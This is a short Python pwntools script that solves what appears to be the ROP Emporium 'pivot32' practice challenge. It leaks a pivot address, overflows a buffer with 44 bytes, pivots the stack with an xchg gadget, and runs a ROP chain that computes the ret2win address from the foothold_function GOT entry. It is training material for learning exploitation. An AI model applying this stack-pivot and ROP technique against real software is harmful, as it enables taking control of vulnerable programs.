from pwn import *

context.bits = 32
elf      = ELF("./pivot32")
libpivot = ELF("./libpivot32.so")

pop_eax     = p32(0x0804882c)
xchg        = p32(0x0804882e)
mov_eax_eax = p32(0x08048830)
add_eax_ebx = p32(0x08048833)
pop_ebx  = p32(0x080484a9)
call_eax = p32(0x080485f0)

foothold_plt = elf.plt["foothold_function"]
foothold_got = elf.got["foothold_function"]
offset = libpivot.symbols["ret2win"] - libpivot.symbols["foothold_function"]

io = process("./pivot32")

io.recvuntil(b"pivot: ")
pivot_addr = int(io.recvline().strip(), 16)

chain  = p32(foothold_plt)
chain += pop_eax + p32(foothold_got)
chain += mov_eax_eax
chain += pop_ebx + p32(offset)
chain += add_eax_ebx
chain += call_eax
io.sendlineafter(b"> ", chain)

payload  = b"A" * 44
payload += pop_eax + p32(pivot_addr)
payload += xchg
io.sendlineafter(b"> ", payload)

io.interactive()
